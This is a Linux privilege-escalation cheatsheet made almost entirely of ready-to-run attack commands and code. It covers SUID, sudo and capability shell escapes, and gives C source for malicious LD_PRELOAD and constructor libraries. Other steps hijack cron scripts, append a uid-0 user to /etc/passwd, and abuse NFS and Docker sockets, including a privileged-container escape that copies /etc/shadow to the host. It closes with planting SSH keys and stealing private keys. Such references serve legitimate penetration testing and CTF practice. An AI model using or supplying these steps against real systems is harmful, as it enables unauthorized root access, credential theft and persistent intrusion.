# Linux Privilege Escalation Cheatsheet

## Initial Enumeration

### System Information

```bash
# OS and kernel version
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version

# Architecture
uname -m
arch

# Hostname
hostname
```

### User Information

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1

# Super users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'

# Currently logged in
w
who

# Last logged in
last

# Groups
cat /etc/group
```

### Network Information

```bash
# Network config
ifconfig
ip a
ip addr

# Routes
route
ip route

# Connections
netstat -antup
ss -tulpn

# ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Hosts
cat /etc/hosts
```

### Running Processes

```bash
ps aux
ps -ef
top
```

---

## Automated Enumeration Tools

```bash
# LinPEAS
./linpeas.sh | tee linpeas_output.txt

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (for cron jobs without root)
./pspy64
./pspy32
```

---

## SUID/SGID Binaries

### Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Find SGID Binaries

```bash
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### GTFOBins Reference

Check https://gtfobins.github.io/ for exploitation techniques

### Common SUID Exploits

```bash
# nmap (older versions)
nmap --interactive
!sh

# find
find . -exec /bin/sh \; -quit

# vim
vim -c ':!/bin/sh'

# awk
awk 'BEGIN {system("/bin/sh")}'

# bash
bash -p

# less
less /etc/passwd
!/bin/sh

# more
more /etc/passwd
!/bin/sh

# nano
nano
^R^X
reset; sh 1>&0 2>&0

# cp (copy /bin/bash with SUID)
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## Capabilities

### Find Capabilities

```bash
getcap -r / 2>/dev/null
```

### Common Capability Exploits

```bash
# python with cap_setuid
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# tar with cap_dac_read_search
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar

# vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## Sudo

### Check Sudo Permissions

```bash
sudo -l
```

### Sudo Exploits

```bash
# Run as another user
sudo -u OTHER_USER /bin/bash

# Environment variables
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/program
sudo LD_LIBRARY_PATH=/tmp /usr/bin/program

# GTFOBins sudo entries
# vim
sudo vim -c ':!/bin/sh'

# less
sudo less /etc/passwd
!/bin/sh

# find
sudo find . -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# perl
sudo perl -e 'exec "/bin/sh";'

# python
sudo python -c 'import os; os.system("/bin/sh")'

# ruby
sudo ruby -e 'exec "/bin/sh"'

# nmap
sudo nmap --interactive
!sh
```

### LD_PRELOAD Exploit

```c
// exploit.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/apache2
```

---

## Cron Jobs

### Enumerate Cron Jobs

```bash
crontab -l
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*

# System-wide cron
ls -la /etc/cron*

# View cron logs
grep "CRON" /var/log/syslog
```

### Exploit Writable Cron Scripts

```bash
# If you can write to a script executed by cron as root
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Then run
/tmp/bash -p
```

### PATH Injection

```bash
# If cron runs script without absolute path
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/scriptname
chmod +x /tmp/scriptname
# Wait for cron to execute
/tmp/bash -p
```

---

## Writable Files/Directories

### Find World-Writable Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
```

### Find World-Writable Files

```bash
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null
```

### Important Writable Files

```bash
# /etc/passwd - add user
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd

# /etc/shadow - crack or replace password
# /etc/sudoers - add sudo permissions
# SSH keys - add your public key
```

---

## NFS Root Squashing

### Check for No Root Squash

```bash
cat /etc/exports
showmount -e TARGET
```

### Exploit (from attacker machine)

```bash
# On attacker
mkdir /tmp/nfs
mount -o rw TARGET:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On victim
/share/bash -p
```

---

## Docker

### Check if in Docker

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
```

### Docker Socket Escape

```bash
# If /var/run/docker.sock is accessible
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privileged Container Escape

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

---

## Kernel Exploits

### Check Kernel Version

```bash
uname -r
cat /proc/version
```

### Common Kernel Exploits

| CVE | Kernel Version | Exploit Name |
|-----|----------------|--------------|
| CVE-2016-5195 | 2.6.22 < 4.8.3 | DirtyCow |
| CVE-2021-4034 | All | PwnKit |
| CVE-2021-3156 | Sudo < 1.9.5p2 | Baron Samedit |
| CVE-2022-0847 | 5.8 < 5.16.11 | DirtyPipe |

### Compile Exploit

```bash
# On attacker
gcc -o exploit exploit.c

# Transfer to victim and run
./exploit
```

---

## Password Hunting

```bash
# Search for passwords in files
grep -r "password" /home 2>/dev/null
grep -r "pass" /var/www 2>/dev/null
grep -ri "password" /etc 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.nano_history
cat ~/.mysql_history

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Hidden files
find / -name ".*" -type f 2>/dev/null
```

---

## SSH Key Exploitation

### Add Your Public Key

```bash
# Generate key pair on attacker
ssh-keygen -t rsa -b 4096

# Add to victim's authorized_keys
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

### Steal Private Keys

```bash
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
```

---

## Shared Library Hijacking

### Find Missing Libraries

```bash
ldd /usr/bin/program
strace /usr/bin/program 2>&1 | grep -i "open.*\.so"
```

### Create Malicious Library

```c
// libevil.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
```

```bash
gcc -shared -fPIC -o /path/to/library.so libevil.c
```



